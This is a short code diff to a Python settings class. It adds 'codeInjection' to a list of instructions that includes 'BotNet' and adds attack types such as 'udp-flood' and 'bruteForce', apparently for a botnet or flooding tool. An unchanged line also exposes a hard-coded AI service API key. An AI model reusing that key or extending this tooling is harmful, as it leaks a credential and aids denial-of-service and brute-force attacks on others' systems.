@@ -106,8 +106,9 @@ class Setting:
         self.CHECK_UPDATE = ['checked', 'unchecked']
         self.CMD_CONDION = {True: "1", False: "0"}
         self.API_KEY_AI = "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"
-        self.INSTRACTION = ['connectToWeb', 'connectBySocket', 'BotNet']
+        self.INSTRACTION = ['connectToWeb', 'connectBySocket', 'BotNet','codeInjection']
         self.STUTAS = ['Active', 'Inactive']
+        self.ACTION_TYPE = ['udp-flood','socket','bruteForce']
 
     def ID(self, n=5):
         """
